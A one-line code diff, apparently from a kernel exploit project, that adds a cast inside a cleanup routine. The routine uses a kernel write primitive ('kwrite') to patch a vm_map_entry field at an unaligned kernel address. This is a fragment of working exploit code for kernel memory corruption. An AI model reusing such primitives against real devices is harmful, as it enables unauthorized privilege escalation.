@@ -497,7 +497,7 @@ void smith_helper_cleanup(struct kfd* kfd)
          * The kwrite() call is just a workaround if the kwrite primitive cannot
          * overwrite 0. Otherwise, the first 4 lines can be omitted.
          */
-        u64 vme_end0_start_and_next[2] = { vme_end0_start, (-1) };
+        u64 vme_end0_start_and_next[2] = { vme_end0_start, (u64)(-1) };
         u64 unaligned_kaddr = vme_end0_kaddr + offsetof(struct vm_map_entry, links.start) + 1;
         u64 unaligned_uaddr = (u64)(&vme_end0_start_and_next) + 1;
         kwrite((u64)(kfd), (void*)(unaligned_uaddr), unaligned_kaddr, sizeof(u64));
